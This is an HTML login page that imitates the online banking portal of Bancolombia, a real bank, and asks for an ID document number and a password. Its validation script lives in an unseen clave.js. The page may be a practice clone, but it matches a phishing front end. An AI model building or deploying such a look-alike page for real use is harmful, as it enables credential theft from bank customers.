<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso de Clave - Bancolombia</title>
    <link rel="stylesheet" href="clave.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">BANCOLOMBIA</div>
            <h1>Sucursal Virtual</h1>
        </div>

        <div class="login-form">
            <h2>Ingreso de Clave</h2>
            
            <div class="form-group">
                <label for="documento">Número de Documento:</label>
                <input type="text" id="documento" placeholder="Ingresa tu número de documento">
            </div>

            <div class="form-group">
                <label for="clave">Clave:</label>
                <input type="password" id="clave" placeholder="Ingresa tu clave">
                <span class="toggle-password" onclick="togglePassword()">👁️</span>
            </div>

            <button onclick="validarClave()" class="btn-login">Ingresar</button>
            
            <div id="mensaje" class="mensaje"></div>
        </div>

        <div class="back-link">
            <a href="../index.html">← Volver al inicio</a>
        </div>
    </div>

    <script src="clave.js"></script>
</body>
</html>
